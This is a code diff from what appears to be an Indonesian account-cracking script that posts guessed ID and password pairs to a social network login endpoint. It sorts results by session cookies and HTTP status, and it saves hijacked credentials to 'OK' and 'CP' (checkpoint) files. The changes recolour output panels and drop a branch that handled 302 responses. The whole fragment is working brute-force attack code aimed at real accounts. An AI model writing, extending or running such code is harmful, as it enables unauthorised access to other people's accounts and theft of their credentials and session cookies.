@@ -1033,9 +1033,9 @@ def fankywww(idf, pwv):
             po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
             if "checkpoint" in ses.cookies.get_dict().keys():
                 cp += 1
-                tree = Tree(Panel.fit(f"""{M2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{M2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{M2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                 prints(tree)
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
@@ -1051,15 +1051,6 @@ def fankywww(idf, pwv):
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
                 open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-                break
-            elif po.status_code == 302:
-                cp += 1
-                tree = Tree(Panel.fit(f"""{K2}  CP AKUN BUTUH VERIFIKASI {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{k2}{ua}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
             else:
                 continue
